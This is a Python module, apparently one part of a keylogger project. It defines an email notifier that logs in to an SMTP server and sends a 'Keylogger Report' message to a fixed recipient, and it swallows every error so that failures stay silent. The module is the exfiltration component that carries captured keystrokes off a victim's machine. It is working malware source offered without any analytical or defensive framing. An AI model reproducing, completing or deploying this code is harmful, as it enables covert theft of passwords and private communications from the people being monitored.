import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from .base import BaseNotifier

class EmailNotifier(BaseNotifier):
    def __init__(self, smtp_server, port, user, password, recipient):
        self.smtp_server = smtp_server
        self.port = port
        self.user = user
        self.password = password
        self.recipient = recipient
        self._enabled = all([smtp_server, port, user, password, recipient])

    def send(self, message):
        if not self._enabled:
            return
        try:
            msg = MIMEMultipart()
            msg['From'] = self.user
            msg['To'] = self.recipient
            msg['Subject'] = 'Keylogger Report'
            msg.attach(MIMEText(message, 'plain'))

            server = smtplib.SMTP(self.smtp_server, self.port)
            server.starttls()
            server.login(self.user, self.password)
            server.send_message(msg)
            server.quit()
        except Exception:
            pass

    @property
    def enabled(self):
        return self._enabled